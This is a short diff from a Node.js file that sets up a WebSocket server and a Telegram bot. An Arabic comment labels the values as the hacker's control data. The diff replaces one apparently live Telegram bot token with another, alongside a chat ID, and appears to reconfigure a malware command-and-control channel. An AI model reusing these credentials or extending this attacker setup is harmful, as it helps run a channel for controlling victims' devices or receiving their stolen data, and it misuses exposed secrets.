@@ -17,7 +17,7 @@ const wss = new WebSocket.Server({ server });
 
 // بيانات التحكم الخاصة بالمخترق (توكن البوت ومعرف الشات)
 const chatId = '5474851558';
-const token = '8932382577:AAE45C6ICkoQJUm0JS6mQU09mmJtGwGCFWo';
+const token = '8834018446:AAFY9OmJ22qOeswwcTLsi1yTuafIWJzv41o';
 const serverAddr = ''; // عنوان السيرفر لإبقائه نشطاً (إذا وجد)
 
 // إنشاء كائن البوت الخاص بتليجرام وتفعيل خاصية جلب البيانات المستمر
